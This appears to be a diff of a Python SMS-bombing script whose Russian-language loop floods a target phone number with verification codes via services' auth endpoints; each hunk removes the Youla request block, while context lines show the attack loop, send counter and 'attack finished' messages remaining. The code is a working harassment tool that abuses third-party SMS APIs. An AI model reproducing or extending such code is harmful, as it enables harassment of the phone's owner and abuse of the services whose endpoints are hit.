@@ -1236,17 +1236,7 @@ if call == str(2):
             time.sleep(1)
         except:
             print('[-] Ошибка при отправке!')
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("Атака закончена! Для закрытия нажмите ENTER...")
-            break
-        try:
-            requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone})
-            R = R + 1
-            print('[+] Youla Отправлено! || Кол-во - ' + str(R))
-            time.sleep(1)
-        except:
-            print('[-] Ошибка при отправке!')
+
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
             print("Атака закончена! Для закрытия нажмите ENTER...")
@@ -1687,16 +1677,7 @@ if call == str(2):
         except:
             print('[-] Ошибка при отправке!')
 
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("Атака закончена! Для закрытия нажмите ENTER...")
-            break
-        try:
-            requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone})
-            R = R + 1
-            print('[+] Youla Отправлено! || Кол-во - ' + str(R))
-        except:
-            print('[-] Ошибка при отправке!')
+
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
@@ -2054,16 +2035,7 @@ if call == str(2):
         except:
             print('[-] Ошибка при отправке!')
 
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("Атака закончена! Для закрытия нажмите ENTER...")
-            break
-        try:
-            requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone})
-            R = R + 1
-            print('[+] Youla Отправлено! || Кол-во - ' + str(R))
-        except:
-            print('[-] Ошибка при отправке!')
+
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
@@ -2150,17 +2122,7 @@ if call == str(2):
             time.sleep(1)
         except:
             print('[-] Ошибка при отправке!')
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("Атака закончена! Для закрытия нажмите ENTER...")
-            break
-        try:
-            requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone})
-            R = R + 1
-            print('[+] Youla Отправлено! || Кол-во - ' + str(R))
-            time.sleep(1)
-        except:
-            print('[-] Ошибка при отправке!')
+
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
             print("Атака закончена! Для закрытия нажмите ENTER...")
@@ -3185,17 +3147,7 @@ if call == str(2):
             time.sleep(1)
         except:
             print('[-] Ошибка при отправке!')
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("Атака закончена! Для закрытия нажмите ENTER...")
-            break
-        try:
-            requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone})
-            R = R + 1
-            print('[+] Youla Отправлено! || Кол-во - ' + str(R))
-            time.sleep(1)
-        except:
-            print('[-] Ошибка при отправке!')
+
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
             print("Атака закончена! Для закрытия нажмите ENTER...")
@@ -3640,16 +3592,7 @@ if call == str(2):
         except:
             print('[-] Ошибка при отправке!')
 
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("Атака закончена! Для закрытия нажмите ENTER...")
-            break
-        try:
-            requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone})
-            R = R + 1
-            print('[+] Youla Отправлено! || Кол-во - ' + str(R))
-        except:
-            print('[-] Ошибка при отправке!')
+
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
@@ -4007,16 +3950,7 @@ if call == str(2):
         except:
             print('[-] Ошибка при отправке!')
 
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("Атака закончена! Для закрытия нажмите ENTER...")
-            break
-        try:
-            requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone})
-            R = R + 1
-            print('[+] Youla Отправлено! || Кол-во - ' + str(R))
-        except:
-            print('[-] Ошибка при отправке!')
+
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
@@ -4103,17 +4037,7 @@ if call == str(2):
             time.sleep(1)
         except:
             print('[-] Ошибка при отправке!')
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("Атака закончена! Для закрытия нажмите ENTER...")
-            break
-        try:
-            requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone})
-            R = R + 1
-            print('[+] Youla Отправлено! || Кол-во - ' + str(R))
-            time.sleep(1)
-        except:
-            print('[-] Ошибка при отправке!')
+
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
             print("Атака закончена! Для закрытия нажмите ENTER...")
@@ -5125,17 +5049,7 @@ if call == str(2):
             time.sleep(1)
         except:
             print('[-] Ошибка при отправке!')
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("Атака закончена! Для закрытия нажмите ENTER...")
-            break
-        try:
-            requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone})
-            R = R + 1
-            print('[+] Youla Отправлено! || Кол-во - ' + str(R))
-            time.sleep(1)
-        except:
-            print('[-] Ошибка при отправке!')
+
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
             print("Атака закончена! Для закрытия нажмите ENTER...")
@@ -5576,16 +5490,7 @@ if call == str(2):
         except:
             print('[-] Ошибка при отправке!')
 
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("Атака закончена! Для закрытия нажмите ENTER...")
-            break
-        try:
-            requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone})
-            R = R + 1
-            print('[+] Youla Отправлено! || Кол-во - ' + str(R))
-        except:
-            print('[-] Ошибка при отправке!')
+
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
@@ -5943,16 +5848,7 @@ if call == str(2):
         except:
             print('[-] Ошибка при отправке!')
 
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("Атака закончена! Для закрытия нажмите ENTER...")
-            break
-        try:
-            requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone})
-            R = R + 1
-            print('[+] Youla Отправлено! || Кол-во - ' + str(R))
-        except:
-            print('[-] Ошибка при отправке!')
+
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
@@ -6039,17 +5935,7 @@ if call == str(2):
             time.sleep(1)
         except:
             print('[-] Ошибка при отправке!')
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("Атака закончена! Для закрытия нажмите ENTER...")
-            break
-        try:
-            requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone})
-            R = R + 1
-            print('[+] Youla Отправлено! || Кол-во - ' + str(R))
-            time.sleep(1)
-        except:
-            print('[-] Ошибка при отправке!')
+
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
             print("Атака закончена! Для закрытия нажмите ENTER...")
@@ -7074,17 +6960,7 @@ if call == str(2):
             time.sleep(1)
         except:
             print('[-] Ошибка при отправке!')
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("Атака закончена! Для закрытия нажмите ENTER...")
-            break
-        try:
-            requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone})
-            R = R + 1
-            print('[+] Youla Отправлено! || Кол-во - ' + str(R))
-            time.sleep(1)
-        except:
-            print('[-] Ошибка при отправке!')
+
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
             print("Атака закончена! Для закрытия нажмите ENTER...")
@@ -7529,16 +7405,7 @@ if call == str(2):
         except:
             print('[-] Ошибка при отправке!')
 
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("Атака закончена! Для закрытия нажмите ENTER...")
-            break
-        try:
-            requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone})
-            R = R + 1
-            print('[+] Youla Отправлено! || Кол-во - ' + str(R))
-        except:
-            print('[-] Ошибка при отправке!')
+
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
@@ -7896,16 +7763,7 @@ if call == str(2):
         except:
             print('[-] Ошибка при отправке!')
 
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("Атака закончена! Для закрытия нажмите ENTER...")
-            break
-        try:
-            requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone})
-            R = R + 1
-            print('[+] Youla Отправлено! || Кол-во - ' + str(R))
-        except:
-            print('[-] Ошибка при отправке!')
+
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
@@ -7992,17 +7850,7 @@ if call == str(2):
             time.sleep(1)
         except:
             print('[-] Ошибка при отправке!')
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("Атака закончена! Для закрытия нажмите ENTER...")
-            break
-        try:
-            requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone})
-            R = R + 1
-            print('[+] Youla Отправлено! || Кол-во - ' + str(R))
-            time.sleep(1)
-        except:
-            print('[-] Ошибка при отправке!')
+
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
             print("Атака закончена! Для закрытия нажмите ENTER...")
@@ -9014,17 +8862,7 @@ if call == str(2):
             time.sleep(1)
         except:
             print('[-] Ошибка при отправке!')
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("Атака закончена! Для закрытия нажмите ENTER...")
-            break
-        try:
-            requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone})
-            R = R + 1
-            print('[+] Youla Отправлено! || Кол-во - ' + str(R))
-            time.sleep(1)
-        except:
-            print('[-] Ошибка при отправке!')
+
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
             print("Атака закончена! Для закрытия нажмите ENTER...")
@@ -9465,16 +9303,7 @@ if call == str(2):
         except:
             print('[-] Ошибка при отправке!')
 
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("Атака закончена! Для закрытия нажмите ENTER...")
-            break
-        try:
-            requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone})
-            R = R + 1
-            print('[+] Youla Отправлено! || Кол-во - ' + str(R))
-        except:
-            print('[-] Ошибка при отправке!')
+
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
@@ -9832,16 +9661,7 @@ if call == str(2):
         except:
             print('[-] Ошибка при отправке!')
 
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("Атака закончена! Для закрытия нажмите ENTER...")
-            break
-        try:
-            requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone})
-            R = R + 1
-            print('[+] Youla Отправлено! || Кол-во - ' + str(R))
-        except:
-            print('[-] Ошибка при отправке!')
+
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
@@ -9928,17 +9748,7 @@ if call == str(2):
             time.sleep(1)
         except:
             print('[-] Ошибка при отправке!')
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("Атака закончена! Для закрытия нажмите ENTER...")
-            break
-        try:
-            requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone})
-            R = R + 1
-            print('[+] Youla Отправлено! || Кол-во - ' + str(R))
-            time.sleep(1)
-        except:
-            print('[-] Ошибка при отправке!')
+
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
             print("Атака закончена! Для закрытия нажмите ENTER...")
@@ -10972,17 +10782,7 @@ if call == str(2):
             time.sleep(1)
         except:
             print('[-] Ошибка при отправке!')
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("Атака закончена! Для закрытия нажмите ENTER...")
-            break
-        try:
-            requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone})
-            R = R + 1
-            print('[+] Youla Отправлено! || Кол-во - ' + str(R))
-            time.sleep(1)
-        except:
-            print('[-] Ошибка при отправке!')
+
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
             print("Атака закончена! Для закрытия нажмите ENTER...")
@@ -11427,16 +11227,7 @@ if call == str(2):
         except:
             print('[-] Ошибка при отправке!')
 
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("Атака закончена! Для закрытия нажмите ENTER...")
-            break
-        try:
-            requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone})
-            R = R + 1
-            print('[+] Youla Отправлено! || Кол-во - ' + str(R))
-        except:
-            print('[-] Ошибка при отправке!')
+
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
@@ -11794,16 +11585,7 @@ if call == str(2):
         except:
             print('[-] Ошибка при отправке!')
 
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("Атака закончена! Для закрытия нажмите ENTER...")
-            break
-        try:
-            requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone})
-            R = R + 1
-            print('[+] Youla Отправлено! || Кол-во - ' + str(R))
-        except:
-            print('[-] Ошибка при отправке!')
+
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
@@ -11890,17 +11672,7 @@ if call == str(2):
             time.sleep(1)
         except:
             print('[-] Ошибка при отправке!')
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("Атака закончена! Для закрытия нажмите ENTER...")
-            break
-        try:
-            requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone})
-            R = R + 1
-            print('[+] Youla Отправлено! || Кол-во - ' + str(R))
-            time.sleep(1)
-        except:
-            print('[-] Ошибка при отправке!')
+
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
             print("Атака закончена! Для закрытия нажмите ENTER...")
